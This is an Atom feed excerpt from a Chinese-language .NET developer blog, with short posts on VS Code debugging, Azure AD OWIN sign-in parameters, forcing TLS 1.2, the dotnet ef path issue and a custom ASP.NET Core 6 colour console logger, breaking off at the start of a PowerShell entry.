<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>亂馬客 - Re:從零開始的軟體開發生活</title>
  <icon>https://www.gravatar.com/avatar/cd3aed042ccd7a5a5d9956b0bc07dc81</icon>
  <subtitle>Re:從零開始的軟體開發生活</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://rainmakerho.github.io/"/>
  <updated>2022-08-04T01:26:35.301Z</updated>
  <id>https://rainmakerho.github.io/</id>
  
  <author>
    <name>亂馬客</name>
    <email>rainmaker_ho@gss.com.tw</email>
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>使用 VS Code Debug 時，Console.ReadLine() 沒作用</title>
    <link href="https://rainmakerho.github.io/2022/08/04/vscode-debug-console-readline-not-work/"/>
    <id>https://rainmakerho.github.io/2022/08/04/vscode-debug-console-readline-not-work/</id>
    <published>2022-08-04T01:10:31.000Z</published>
    <updated>2022-08-04T01:26:35.301Z</updated>
    
    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>透過 VS Code 偵錯時，程式到了 <code>var input=Console.ReadLine();</code>後，<br>會在 <strong>偵錯主控台</strong> 接受使用者的輸入，<br>但輸入值按下 Enter 鍵後，卻沒有作用 </p><h3 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h3><p>查到 <a href="https://stackoverflow.com/questions/41195432/debug-console-window-cannot-accept-console-readline-input-during-debugging" target="_blank" rel="noopener">Debug Console window cannot accept Console.ReadLine() input during debugging</a>，<br>因為 <strong>launch.json</strong> 中 <strong>configurations-&gt;console</strong> 的 <strong>internalConsole</strong> 不 Support Console.ReadLine() 。<br><img src="/2022/08/04/vscode-debug-console-readline-not-work/01.png" title="internalConsole"></p><p>所以要將它改成 <strong>externalTerminal</strong> 或是 <strong>integratedTerminal</strong> 才可以。</p><h3 id="參考資源"><a href="#參考資源" class="headerlink" title="參考資源"></a>參考資源</h3><p><a href="https://stackoverflow.com/questions/41195432/debug-console-window-cannot-accept-console-readline-input-during-debugging" target="_blank" rel="noopener">Debug Console window cannot accept Console.ReadLine() input during debugging</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;透過 VS Code 偵錯時，程式到了 &lt;code&gt;var input=Console.ReadLine();&lt;/code&gt;後，&lt;br&gt;會在
      
    
    </summary>
    
    
      <category term="VSCode" scheme="https://rainmakerho.github.io/tags/VSCode/"/>
    
      <category term="Console.ReadLine" scheme="https://rainmakerho.github.io/tags/Console-ReadLine/"/>
    
      <category term="internalConsole" scheme="https://rainmakerho.github.io/tags/internalConsole/"/>
    
      <category term="偵錯主控台" scheme="https://rainmakerho.github.io/tags/%E5%81%B5%E9%8C%AF%E4%B8%BB%E6%8E%A7%E5%8F%B0/"/>
    
  </entry>
  
  <entry>
    <title>ASP.NET MVC 使用 Microsoft.Owin.Security 驗證 Azure AD，並傳送自定參數</title>
    <link href="https://rainmakerho.github.io/2022/07/29/mvc5-owin-azure-ad-openid/"/>
    <id>https://rainmakerho.github.io/2022/07/29/mvc5-owin-azure-ad-openid/</id>
    <published>2022-07-29T06:49:21.000Z</published>
    <updated>2022-07-29T07:12:22.802Z</updated>
    
    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>同事在練習 <a href="https://docs.microsoft.com/zh-tw/learn/modules/msgraph-build-aspnetmvc-apps/5-exercise-add-auth" target="_blank" rel="noopener">將 Microsoft 驗證程式庫納入 ASP.NET MVC Web 應用程式</a> 時，想要在 <strong>AccountController</strong> 的 <strong>SignIn()</strong> 中，在轉址到 Azure AD 驗證登入前先存入某些參數，然後在 Azure AD 驗證登入成功後，取回該參數。</p><h3 id="準備環境"><a href="#準備環境" class="headerlink" title="準備環境"></a>準備環境</h3><p>透過 Visual Studio 新增 ASP.NET MVC 專案，並加入以下的 Nuget 套件，</p><ul><li>Microsoft.Owin</li><li>Microsoft.Owin.Host.SystemWeb</li><li>Microsoft.Owin.Security</li><li>Microsoft.Owin.Security.Cookies</li><li>Microsoft.Owin.Security.OpenIdConnect</li><li>Microsoft.Graph</li></ul><h3 id="測試"><a href="#測試" class="headerlink" title="測試"></a>測試</h3><p>要額外傳送參數，可以透過 <strong>AuthenticationProperties</strong> 的 Dictionary 來加入額外的參數。<br>所以在 <strong>AccountController</strong> 的 <strong>SignIn()</strong> 中，可以加入一個 tuid 的參數，如下，<br><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">SignIn</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// Signal OWIN to send an authorization request to Azure</span></span><br><span class="line">    <span class="keyword">var</span> authProps = <span class="keyword">new</span> AuthenticationProperties</span><br><span class="line">    &#123;</span><br><span class="line">        RedirectUri = <span class="string">"/"</span>,</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="comment">//加入額外要傳遞的參數到 Dictionary 之中</span></span><br><span class="line">    <span class="keyword">var</span> guid = Guid.NewGuid().ToString();</span><br><span class="line">    authProps.Dictionary.Add(<span class="string">"tuid"</span>, guid);</span><br><span class="line"></span><br><span class="line">    Request.GetOwinContext().Authentication.Challenge(</span><br><span class="line">            authProps,</span><br><span class="line">            OpenIdConnectAuthenticationDefaults.AuthenticationType);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><img src="/2022/07/29/mvc5-owin-azure-ad-openid/01.png" title="Dictionary.Add"><p>Azure AD 登入驗證完成後，會進入到 <strong>OnAuthorizationCodeReceivedAsync</strong> Method 之中，<br>就可以透過參數 <strong>notification</strong> 中的 <strong>AuthenticationTicket.Properties.Dictionary</strong> 取出參數值，如下，<br><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">async</span> Task <span class="title">OnAuthorizationCodeReceivedAsync</span>(<span class="params"></span></span></span><br><span class="line"><span class="function"><span class="params">            AuthorizationCodeReceivedNotification notification</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> tuid = <span class="keyword">string</span>.Empty;</span><br><span class="line">    <span class="keyword">if</span>(notification.AuthenticationTicket</span><br><span class="line">        .Properties.Dictionary.TryGetValue(<span class="string">"tuid"</span>, <span class="keyword">out</span> tuid))&#123;</span><br><span class="line">        <span class="comment">//正確取回 tuid 的值 ...</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">var</span> idClient = ConfidentialClientApplicationBuilder.Create(appId)</span><br><span class="line">        .WithRedirectUri(redirectUri)</span><br><span class="line">        .WithClientSecret(appSecret)</span><br><span class="line">        .Build();</span><br><span class="line">    <span class="comment">// ... 原範例程式碼</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><img src="/2022/07/29/mvc5-owin-azure-ad-openid/02.png" title="Dictionary.TryGetValue"><h3 id="參考資源"><a href="#參考資源" class="headerlink" title="參考資源"></a>參考資源</h3><p><a href="https://docs.microsoft.com/zh-tw/learn/modules/msgraph-build-aspnetmvc-apps/5-exercise-add-auth" target="_blank" rel="noopener">將 Microsoft 驗證程式庫納入 ASP.NET MVC Web 應用程式</a><br><a href="https://hajekj.net/2018/06/12/passing-state-through-authentication-in-asp-net-core/" target="_blank" rel="noopener">Passing state through authentication in ASP.NET Core</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;同事在練習 &lt;a href=&quot;https://docs.microsoft.com/zh-tw/learn/modules/msgraph-
      
    
    </summary>
    
    
      <category term="ASP.NET MVC" scheme="https://rainmakerho.github.io/tags/ASP-NET-MVC/"/>
    
      <category term="Azure AD" scheme="https://rainmakerho.github.io/tags/Azure-AD/"/>
    
      <category term="Owin.Security" scheme="https://rainmakerho.github.io/tags/Owin-Security/"/>
    
      <category term="Owin.Security.OpenIdConnect" scheme="https://rainmakerho.github.io/tags/Owin-Security-OpenIdConnect/"/>
    
      <category term="AuthenticationProperties" scheme="https://rainmakerho.github.io/tags/AuthenticationProperties/"/>
    
      <category term="AuthorizationCodeReceivedNotification" scheme="https://rainmakerho.github.io/tags/AuthorizationCodeReceivedNotification/"/>
    
  </entry>
  
  <entry>
    <title>用戶端和伺服器無法溝通，因為它們沒有公用的演算法</title>
    <link href="https://rainmakerho.github.io/2022/07/12/tls-do-not-a-common-algorithm/"/>
    <id>https://rainmakerho.github.io/2022/07/12/tls-do-not-a-common-algorithm/</id>
    <published>2022-07-12T03:56:27.000Z</published>
    <updated>2022-07-12T05:02:11.911Z</updated>
    
    <content type="html"><![CDATA[<h3 id="問題"><a href="#問題" class="headerlink" title="問題"></a>問題</h3><p>最近同事將一台 Server 設定停用 TLS 1.0, TLS 1.1 後，<br>ASP.NET 4.X 的程式呼叫 Https 的 Web Service 會噴出 <strong>用戶端和伺服器無法溝通，因為它們沒有公用的演算法。</strong> 的錯誤。</p><h3 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h3><p>後來在程式中設定強迫走 TLS 1.2 就可以正常運行。</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;</span><br></pre></td></tr></table></figure><h3 id="參考資源"><a href="#參考資源" class="headerlink" title="參考資源"></a>參考資源</h3><p><a href="https://stackoverflow.com/questions/26742054/the-client-and-server-cannot-communicate-because-they-do-not-possess-a-common-a" target="_blank" rel="noopener">The client and server cannot communicate, because they do not possess a common algorithm - ASP.NET C# IIS TLS 1.0 / 1.1 / 1.2 - Win32Exception</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;問題&quot;&gt;&lt;a href=&quot;#問題&quot; class=&quot;headerlink&quot; title=&quot;問題&quot;&gt;&lt;/a&gt;問題&lt;/h3&gt;&lt;p&gt;最近同事將一台 Server 設定停用 TLS 1.0, TLS 1.1 後，&lt;br&gt;ASP.NET 4.X 的程式呼叫 Https 的 W
      
    
    </summary>
    
    
      <category term="ASP.NET" scheme="https://rainmakerho.github.io/tags/ASP-NET/"/>
    
      <category term="TLS" scheme="https://rainmakerho.github.io/tags/TLS/"/>
    
      <category term="TLS 1.2" scheme="https://rainmakerho.github.io/tags/TLS-1-2/"/>
    
      <category term="Disable TLS 1.1" scheme="https://rainmakerho.github.io/tags/Disable-TLS-1-1/"/>
    
  </entry>
  
  <entry>
    <title>dotnet ef 因為找不到指定的命令或檔案，所以無法執行</title>
    <link href="https://rainmakerho.github.io/2022/07/12/cannot-find-command-dotnet-ef/"/>
    <id>https://rainmakerho.github.io/2022/07/12/cannot-find-command-dotnet-ef/</id>
    <published>2022-07-12T02:34:55.000Z</published>
    <updated>2022-07-12T03:52:43.013Z</updated>
    
    <content type="html"><![CDATA[<h3 id="問題"><a href="#問題" class="headerlink" title="問題"></a>問題</h3><p>今天同事詢問安裝過了 EF Core 後，執行 dotnet ef 指令會發生 <strong>因為找不到指定的命令或檔案，所以無法執行</strong> 的錯誤，如下，<br><img src="/2022/07/12/cannot-find-command-dotnet-ef/01.png" title="因為找不到指定的命令或檔案，所以無法執行"></p><h3 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h3><p>詳細看一下後，訊息是 <strong>找不到</strong> ，<br>往上看命令視窗的指令是 <code>dotnet tool install --global dotnet-ef</code><br>所以是剛裝好 EF Core 後，<br>立馬在<strong>同一個</strong>視窗中執行 <code>dotnet ef</code> ，<br>應該是因為 EF Core 安裝後，這個 Command 視窗的 Path 變數並未加入 EF Core 的 Path。</p><p>所以會找不到 EF Core 的指令，<strong>另開一個 Command 視窗</strong>就可以了。<br>或是手動將 EF Core 的 Path 加入到目前這個 Command 視窗中的 Path 變數。</p><h3 id="參考資源"><a href="#參考資源" class="headerlink" title="參考資源"></a>參考資源</h3><p><a href="https://stackoverflow.com/questions/56862089/cannot-find-command-dotnet-ef" target="_blank" rel="noopener">Cannot find command ‘dotnet ef’</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;問題&quot;&gt;&lt;a href=&quot;#問題&quot; class=&quot;headerlink&quot; title=&quot;問題&quot;&gt;&lt;/a&gt;問題&lt;/h3&gt;&lt;p&gt;今天同事詢問安裝過了 EF Core 後，執行 dotnet ef 指令會發生 &lt;strong&gt;因為找不到指定的命令或檔案，所以無法執行&lt;/
      
    
    </summary>
    
    
      <category term="EF Core" scheme="https://rainmakerho.github.io/tags/EF-Core/"/>
    
      <category term="dotnet" scheme="https://rainmakerho.github.io/tags/dotnet/"/>
    
      <category term="dotnet ef" scheme="https://rainmakerho.github.io/tags/dotnet-ef/"/>
    
      <category term="dotnet-ef" scheme="https://rainmakerho.github.io/tags/dotnet-ef/"/>
    
      <category term="因為找不到指定的命令或檔案，所以無法執行" scheme="https://rainmakerho.github.io/tags/%E5%9B%A0%E7%82%BA%E6%89%BE%E4%B8%8D%E5%88%B0%E6%8C%87%E5%AE%9A%E7%9A%84%E5%91%BD%E4%BB%A4%E6%88%96%E6%AA%94%E6%A1%88%EF%BC%8C%E6%89%80%E4%BB%A5%E7%84%A1%E6%B3%95%E5%9F%B7%E8%A1%8C/"/>
    
  </entry>
  
  <entry>
    <title>ASP.NET Core 6 實作 Logger</title>
    <link href="https://rainmakerho.github.io/2022/07/09/aspnet6-custom-logger/"/>
    <id>https://rainmakerho.github.io/2022/07/09/aspnet6-custom-logger/</id>
    <published>2022-07-09T06:24:24.000Z</published>
    <updated>2022-07-09T07:49:28.382Z</updated>
    
    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>ASP.NET Core 已有許多的 Logging Provider ，<br>如果自已實作一個 Color Console 的 Logger 要如何做呢?</p><h3 id="實作"><a href="#實作" class="headerlink" title="實作"></a>實作</h3><p>需要一個 Config 物件來記錄設定值，Logger 物件來寫 Log，<br>Logger Provider 物件負責建立 Logger 及 Extensions 物件來簡化註冊 Logger。</p><p>1.建立 CustomLoggerConfiguration<br><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">CustomLoggerConfiguration</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> EventId &#123; <span class="keyword">get</span>; <span class="keyword">set</span>; &#125;</span><br><span class="line">    <span class="keyword">public</span> Dictionary&lt;LogLevel, ConsoleColor&gt; LogLevels &#123; <span class="keyword">get</span>; <span class="keyword">set</span>; &#125; = <span class="keyword">new</span>()</span><br><span class="line">    &#123;</span><br><span class="line">        [<span class="meta">LogLevel.Information</span>] = ConsoleColor.Yellow</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>2.建立 Logger 物件<br><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">CustomLogger</span> : <span class="title">ILogger</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">object</span> _lock = <span class="keyword">new</span> <span class="keyword">object</span>();</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">readonly</span> <span class="keyword">string</span> _name;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">readonly</span> Func&lt;CustomLoggerConfiguration&gt; _getCurrentConfig;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">CustomLogger</span>(<span class="params"><span class="keyword">string</span> name,</span></span></span><br><span class="line"><span class="function"><span class="params">        Func&lt;CustomLoggerConfiguration&gt; getCurrentConfig</span>) </span>=&gt;</span><br><span class="line">            (_name, _getCurrentConfig) = (name, getCurrentConfig);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> IDisposable BeginScope&lt;TState&gt;(TState state) =&gt; <span class="keyword">default</span>!;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">bool</span> <span class="title">IsEnabled</span>(<span class="params">LogLevel logLevel</span>) </span>=&gt; </span><br><span class="line">        _getCurrentConfig().LogLevels.ContainsKey(logLevel);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> Log&lt;TState&gt;(LogLevel logLevel,</span><br><span class="line">        EventId eventId,</span><br><span class="line">        TState state,</span><br><span class="line">        Exception exception,</span><br><span class="line">        Func&lt;TState, Exception, <span class="keyword">string</span>&gt; formatter</span><br><span class="line">        )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (!IsEnabled(logLevel))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">lock</span> (_lock)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">var</span> config = _getCurrentConfig();</span><br><span class="line">            <span class="keyword">if</span> (config.EventId == <span class="number">0</span> ||</span><br><span class="line">                config.EventId == eventId.Id)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">var</span> color = Console.ForegroundColor;</span><br><span class="line">                Console.ForegroundColor = config.LogLevels[logLevel];</span><br><span class="line">                Console.Write(<span class="string">$"<span class="subst">&#123;logLevel&#125;</span> - "</span>);</span><br><span class="line">                Console.Write(<span class="string">$"<span class="subst">&#123;eventId.Id&#125;</span> - <span class="subst">&#123;_name&#125;</span> -"</span>);</span><br><span class="line">                Console.WriteLine(<span class="string">$"<span class="subst">&#123;formatter(state, exception)&#125;</span>"</span>);</span><br><span class="line">                Console.ForegroundColor = color;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>註: Console 並不是 Thread-Safe 物件，所以這裡使用 lock<br>註: Config 有設定，才會啟用 Log</p><p>3.建立 Logger Provider<br><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">CustomLoggerProvider</span> :</span><br><span class="line">    <span class="title">ILoggerProvider</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">readonly</span> IDisposable _onChangeToken;</span><br><span class="line">    <span class="keyword">private</span> CustomLoggerConfiguration _currentConfig;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">readonly</span> ConcurrentDictionary&lt;<span class="keyword">string</span>, CustomLogger&gt; _loggers =</span><br><span class="line">        <span class="keyword">new</span>(StringComparer.OrdinalIgnoreCase);</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">CustomLoggerProvider</span>(<span class="params">IOptionsMonitor&lt;CustomLoggerConfiguration&gt; config</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        _currentConfig = config.CurrentValue;</span><br><span class="line">        _onChangeToken = config.OnChange(updatedConfig =&gt; _currentConfig = updatedConfig);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> CustomLoggerConfiguration <span class="title">GetCurrentConfig</span>(<span class="params"></span>) </span>=&gt; _currentConfig;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> ILogger <span class="title">CreateLogger</span>(<span class="params"><span class="keyword">string</span> categoryName</span>) </span>=&gt;</span><br><span class="line">        _loggers.GetOrAdd(categoryName, name =&gt;</span><br><span class="line">                            <span class="keyword">new</span> CustomLogger(name, GetCurrentConfig));</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">Dispose</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        _loggers.Clear();</span><br><span class="line">        _onChangeToken.Dispose();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>4.建立 Extensions 物件來簡化註冊 Logger<br><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title">CustomLoggerExtensions</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> ILoggingBuilder <span class="title">AddCustomLogger</span>(<span class="params"><span class="keyword">this</span> ILoggingBuilder builder</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        builder.AddConfiguration();</span><br><span class="line"></span><br><span class="line">        builder.Services.TryAddEnumerable(</span><br><span class="line">            ServiceDescriptor.Singleton&lt;ILoggerProvider, CustomLoggerProvider&gt;());</span><br><span class="line"></span><br><span class="line">        LoggerProviderOptions.RegisterProviderOptions</span><br><span class="line">            &lt;CustomLoggerConfiguration, CustomLoggerProvider&gt;(builder.Services);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> builder;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> ILoggingBuilder <span class="title">AddCustomLogger</span>(<span class="params"><span class="keyword">this</span> ILoggingBuilder builder,</span></span></span><br><span class="line"><span class="function"><span class="params">        Action&lt;CustomLoggerConfiguration&gt; configure</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        builder.AddCustomLogger();</span><br><span class="line">        builder.Services.Configure(configure);</span><br><span class="line">        <span class="keyword">return</span> builder;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>5.在 Program.cs 中使用 CustomLogger<br><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Program.cs</span></span><br><span class="line">builder.Logging.ClearProviders();</span><br><span class="line">builder.Logging.AddCustomLogger();</span><br></pre></td></tr></table></figure></p><p>6.在 appsettings.json 中設定 LogLevel 要顯示的 Color<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="string">"Logging"</span>: &#123;</span><br><span class="line">    <span class="string">"LogLevel"</span>: &#123;</span><br><span class="line">      <span class="string">"Default"</span>: <span class="string">"Trace"</span>,</span><br><span class="line">      <span class="string">"Microsoft"</span>: <span class="string">"Warning"</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="string">"CustomLogger"</span>: &#123;</span><br><span class="line">      <span class="string">"LogLevels"</span>: &#123;</span><br><span class="line">        <span class="string">"Trace"</span>: <span class="string">"White"</span>,</span><br><span class="line">        <span class="string">"Debug"</span>: <span class="string">"Blue"</span>,</span><br><span class="line">        <span class="string">"Information"</span>: <span class="string">"Green"</span>,</span><br><span class="line">        <span class="string">"Warning"</span>: <span class="string">"DarkYellow"</span>,</span><br><span class="line">        <span class="string">"Error"</span>: <span class="string">"Red"</span>,</span><br><span class="line">        <span class="string">"Critical"</span>: <span class="string">"Cyan"</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>7.在 HomeControll 中依各 LogLevel 寫出 Log<br><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">logger.LogTrace(<span class="string">"Log Trace"</span>);</span><br><span class="line">logger.LogDebug(<span class="string">"Log Debue"</span>);</span><br><span class="line">logger.LogInformation(<span class="string">" Log Info"</span>);</span><br><span class="line">logger.LogWarning(<span class="string">"Log Warning"</span>);</span><br><span class="line">logger.LogError(<span class="string">"Log Error"</span>);</span><br><span class="line">logger.LogCritical(<span class="string">"Log Critical"</span>);</span><br></pre></td></tr></table></figure></p><p>註: 程式運行中，修改 appsettings.json 中 Debug 為 DarkBlue ，重整頁面，Log 就會套用新的設定值<br><img src="/2022/07/09/aspnet6-custom-logger/01.png" title="Loggger.Log"></p><h3 id="參考資源"><a href="#參考資源" class="headerlink" title="參考資源"></a>參考資源</h3><p><a href="https://docs.microsoft.com/en-us/aspnet/core/fundamentals/logging/" target="_blank" rel="noopener">Logging in .NET Core and ASP.NET Core</a><br><a href="https://docs.microsoft.com/en-us/dotnet/core/extensions/custom-logging-provider" target="_blank" rel="noopener">Implement a custom logging provider in .NET</a><br><a href="https://docs.microsoft.com/en-us/dotnet/api/system.consolecolor" target="_blank" rel="noopener">ConsoleColor Enum</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;ASP.NET Core 已有許多的 Logging Provider ，&lt;br&gt;如果自已實作一個 Color Console 的 Logg
      
    
    </summary>
    
    
      <category term="asp.net core" scheme="https://rainmakerho.github.io/tags/asp-net-core/"/>
    
      <category term="logger" scheme="https://rainmakerho.github.io/tags/logger/"/>
    
      <category term="custom" scheme="https://rainmakerho.github.io/tags/custom/"/>
    
  </entry>
  
  <entry>
    <title>Import-Module 出現 Could not load file or assembly or one of its dependencies. Operation is not supported. 0x80131515 錯誤</title>
    <link href="https://rainmakerho.github.io/2022/07/05/ps-import-module-0x80131515/"/>
    <id>https://rainmakerho.github.io/2022/07/05/ps-import-module-0x80131515/</id>
    <published>2022-07-05T09:18:59.000Z</published>
    <updated>2022-07-05T09:40:29.580Z</updated>
    
